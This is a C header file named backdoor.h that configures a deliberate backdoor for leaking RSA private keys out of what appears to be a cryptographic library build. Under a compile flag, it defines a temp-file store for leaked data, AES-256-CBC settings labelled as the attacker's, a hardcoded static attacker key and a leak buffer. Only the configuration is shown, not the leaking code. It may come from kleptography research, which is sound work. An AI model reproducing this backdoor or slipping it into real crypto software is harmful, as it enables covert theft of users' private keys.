#ifndef BACKDOOR_H
#define BACKDOOR_H

	#ifdef BACKDOORED
	  // We use symmetric channel
	  #define SYMMETRIC_CHANNEL

      // Rather inelegant way to store leaked data
      #define TMP_STORAGE "/tmp/21bf21f8a9aedc6a395dd0720a1e11ec2220804c"

      // We currently only support leaking RSA private keys (2048 and 4096 bit)
      // This is not an inherent but an implementation limitation
      #define is_RSA(a) ((a)>=1 && (a)<=3)

	  // Channel configuration
      #ifdef SYMMETRIC_CHANNEL
          #define LEAK_SIZE 32            // leak channel bandwith of 256 bits

          #define ATTACKER_ALGO 0x09      // CIPHER_ALGO_AES256 
          #define ATTACKER_MODE 0x06      // CIPHER_MODE_CBC
          #define ATTACKER_KEYLEN 32      // 256-bit symmetric key
          #define ATTACKER_IVLEN 16       // 128-bit blocks

          // Dynamic attacker IV
          unsigned char attacker_iv[ATTACKER_IVLEN] = {0};

          // Static attacker key
          const unsigned char attacker_symkey[ATTACKER_KEYLEN] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};

          // Leak buffer
          unsigned char leak_buffer[LEAK_SIZE] = {0};
      #endif

	  #define min(a,b) ({ __typeof__ (a) _a = (a); __typeof__ (b) _b = (b); _a > _b ? _b: _a; })
	#endif

#endif